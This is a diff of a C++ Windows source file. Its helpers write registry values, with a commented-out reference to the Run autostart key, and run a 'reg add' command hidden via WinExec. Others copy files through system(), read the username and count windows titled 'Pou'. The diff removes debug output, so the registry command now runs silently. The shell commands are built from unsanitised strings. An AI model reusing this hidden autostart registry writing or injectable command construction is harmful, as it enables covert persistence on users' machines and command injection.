@@ -1,12 +1,12 @@
 #include "Common.h"
 
+// Old regedit methods, im too dumb to make them work so im just going to use the easier one.
 int editRegistry() {
 
 	//LPCSTR subkey = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
 	//PHKEY hregkey;
 
 	//RegOpenKeyExA(HKEY_CURRENT_USER, subkey, 0, KEY_WRITE, hregkey);
-
 
 	LONG lReg;
 	HKEY hKey;
@@ -32,7 +32,6 @@ int editRegistry() {
 	return lReg;
 
 }
-
 
 int setRegValue(LPCTSTR LOCATION) {
 
@@ -64,35 +63,22 @@ int setRegValue(LPCTSTR LOCATION) {
 		(LPBYTE)sk,
 		1024
 	);
-
-
 	RegCloseKey(hKey);
-
 	return lReg;
 }
 
+// Functions
 
 int setRegestryValue(string Location, string Name, string Type , string Data) {
-
-
 	string finalCommand = "reg add \"" + Location + "\" /v \"" + Name + "\" /t \"" + Type + "\" /d \"" + Data + "\" /f";
-
-	cout << finalCommand << endl;
-
+	//cout << finalCommand << endl;		Not really needed, will probably remove
 	LPCSTR sendingCommand = finalCommand.c_str();
-
-
 	return WinExec(sendingCommand, SW_HIDE);
 
 }
 
-
-
 int copyFile(string file, string destination, string fileName) {
 	string command = "copy \"" + file + "\" \"" + destination + "\\" + fileName + "\"";
-
-	cout << command << endl;
-
 	LPCSTR finalCommand = command.c_str();
 	system(finalCommand);
 }
@@ -101,13 +87,11 @@ string username() {
 	char username[UNLEN + 1];
 	DWORD username_len = UNLEN + 1;
 	GetUserNameA(username, &username_len);
-
 	return username;
 }
 
 int getNumOfWindows() {
 	int Num = 0;
-	//bool exitResult{};
 
 	std::string target;
 	for (HWND hwnd = GetTopWindow(NULL); hwnd != NULL; hwnd = GetNextWindow(hwnd, GW_HWNDNEXT))
@@ -122,9 +106,6 @@ int getNumOfWindows() {
 
 		char* title = new char[length + 1];
 		GetWindowTextA(hwnd, title, length + 1);
-
-		//std::cout << hwnd << "|" << title << std::endl;
-
 		std::vector<std::string> keywords{ "Pou", "pou" };
 		std::string input = title;
 
@@ -132,11 +113,7 @@ int getNumOfWindows() {
 		for (const auto& keyword : keywords)
 		{
 			auto pos = input.find(keyword);
-
-			//std::cout << keyword << " [" << (pos == std::string::npos ? "" : "found") << "]\n";
-
 			if (pos != std::string::npos) {
-				//exitResult = true;
 				Num++;
 			}
 		}
